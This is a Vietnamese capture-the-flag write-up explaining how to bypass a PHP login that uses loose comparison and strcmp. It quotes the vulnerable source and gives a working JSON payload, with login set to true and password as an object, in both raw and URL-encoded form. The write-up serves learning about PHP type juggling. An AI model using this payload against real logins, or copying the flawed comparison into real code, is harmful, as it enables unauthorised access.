Ngoài những kiến thức về `type-juggling/loose-comparison` trong doc của rootme và những chall đã làm, ở đây muốn bypass authentication chúng ta phải lừa hàm strcmp. Xem source code:

```php
<?php

// $FLAG, $USER and $PASSWORD_SHA256 in secret file
require("secret.php");

// show my source code
if(isset($_GET['source'])){
    show_source(__FILE__);
    die();
}

$return['status'] = 'Authentication failed!';
if (isset($_POST["auth"]))  { 
    // retrieve JSON data
    $auth = @json_decode($_POST['auth'], true);
    
    // check login and password (sha256)
    if($auth['data']['login'] == $USER && !strcmp($auth['data']['password'], $PASSWORD_SHA256)){
        $return['status'] = "Access granted! The validation password is: $FLAG";
    }
}
print json_encode($return);
```

Vậy 2 yếu tố để bypass chúng ta đã biết 1: gán cho login giá trị boolean true thì phép so sánh `$auth['data']['login'] == $USER` sẽ luôn đúng. Phần còn lại thì theo như [link](http://danuxx.blogspot.com/2013/03/unauthorized-access-bypassing-php-strcmp.html) này, hàm strcmp có 1 lỗ hổng: vẫn return 0 khi so sánh 1 string với 1 object! Như vậy biến `auth` mình sẽ viết như sau:

> auth = {"data":{"login":true,"password":{"a":1,"b":2}}}

urlencode:

> auth=%7B%22data%22%3A%7B%22login%22%3Atrue%2C%22password%22%3A%7B%22a%22%3A1%2C%22b%22%3A2%7D%7D%7D

Nộp cùng `POST` request sẽ lấy được password